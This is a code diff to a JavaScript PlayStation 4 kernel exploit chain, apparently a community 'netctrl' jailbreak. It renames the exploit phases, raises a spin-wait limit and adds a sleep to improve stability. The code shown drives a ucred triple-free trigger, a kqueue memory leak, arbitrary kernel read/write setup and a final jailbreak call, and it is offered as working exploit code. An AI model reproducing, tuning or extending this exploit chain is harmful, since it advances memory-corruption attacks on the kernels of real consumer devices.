@@ -477,7 +477,7 @@ function wait_for(addr, threshold) {
     threshold = new BigInt(0x0, threshold);
   }
   var spins = 0;
-  var MAX_SPINS = 20000;
+  var MAX_SPINS = 40000;
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(1);
     spins++;
@@ -926,47 +926,48 @@ function yield_to_render(callback) {
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
+  nanosleep_fun(1);
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
     return;
   }
   log('Stability by M.ELHOUT');
-  yield_to_render(exploit_phase_setup);
+  yield_to_render(phase_setup);
 }
-function exploit_phase_setup () {
+function phase_setup () {
   setup()
   log('Workers spawned')
   exploit_count = 0
   exploit_end = false
-  yield_to_render(exploit_phase_trigger)
+  yield_to_render(phase_trigger)
 }
-function exploit_phase_trigger() {
+function phase_trigger() {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed-please Restart your ps4 #');
     cleanup();
     return;
   }
   exploit_count++;
-  if (!trigger_ucred_triplefree()) {
-    yield_to_render(exploit_phase_trigger);
+  if (!trigger_triplefree()) {
+    yield_to_render(phase_trigger);
     return;
   }
-  yield_to_render(exploit_phase_leak);
+  yield_to_render(phase_leak);
 }
-function exploit_phase_leak() {
+function phase_leak() {
   log('Leaking .....');
-  if (!leak_kqueue_safe()) {
-    yield_to_render(exploit_phase_trigger);
+  if (!leak_safe()) {
+    yield_to_render(phase_trigger);
     return;
   }
-  yield_to_render(exploit_phase_rw);
+  yield_to_render(phase_rw);
 }
-function exploit_phase_rw() {
+function phase_rw() {
   setup_arbitrary_rw();
-  yield_to_render(exploit_phase_jailbreak);
+  yield_to_render(phase_jailbreak);
 }
-function exploit_phase_jailbreak() {
+function phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
@@ -1327,7 +1328,7 @@ function remove_uaf_file() {
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
-function trigger_ucred_triplefree() {
+function trigger_triplefree() {
   var end = false;
 
   // msgIov كما في الأصلي
@@ -1483,7 +1484,7 @@ function leak_kqueue() {
   }
   return false;
 }
-function leak_kqueue_safe() {
+function leak_safe() {
   try {
     return leak_kqueue();
   } catch (e) {
